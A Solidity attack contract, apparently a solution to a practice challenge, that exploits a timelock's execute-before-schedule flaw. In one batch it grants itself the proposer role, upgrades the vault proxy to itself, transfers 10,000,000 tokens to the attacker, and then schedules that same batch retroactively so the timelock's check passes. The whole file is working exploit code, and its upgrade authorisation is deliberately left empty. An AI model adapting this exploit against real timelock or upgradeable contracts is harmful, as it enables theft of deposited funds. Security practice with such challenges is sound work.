// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttack is UUPSUpgradeable {
    ClimberTimelock immutable timelock;
    ClimberVault immutable climbervault;
    IERC20 immutable token;
    address immutable attacker;

    constructor(
        address timelockAddress,
        address vaultAddress,
        address tokenAddress
    ) {
        timelock = ClimberTimelock(payable(timelockAddress));
        climbervault = ClimberVault(vaultAddress);
        token = IERC20(tokenAddress);
        attacker = msg.sender;
    }

    function _getProposalArguments()
        internal
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        )
    {
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = address(timelock);
        dataElements[0] = abi.encodeCall(
            timelock.grantRole,
            (timelock.PROPOSER_ROLE(), address(this))
        );

        targets[1] = address(climbervault);
        dataElements[1] = abi.encodeCall(
            climbervault.upgradeTo,
            (address(this))
        );

        targets[2] = address(climbervault);
        dataElements[2] = abi.encodeCall(this.drainFunds, ());

        targets[3] = address(this);
        dataElements[3] = abi.encodeCall(this.createProposal, ());
    }

    function attack() public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = _getProposalArguments();
        bytes32 salt;
        timelock.execute(targets, values, dataElements, salt);
    }

    function createProposal() public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = _getProposalArguments();
        bytes32 salt;
        timelock.schedule(targets, values, dataElements, salt);
    }

    function drainFunds() public {
        token.transfer(attacker, 10000000 ether);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
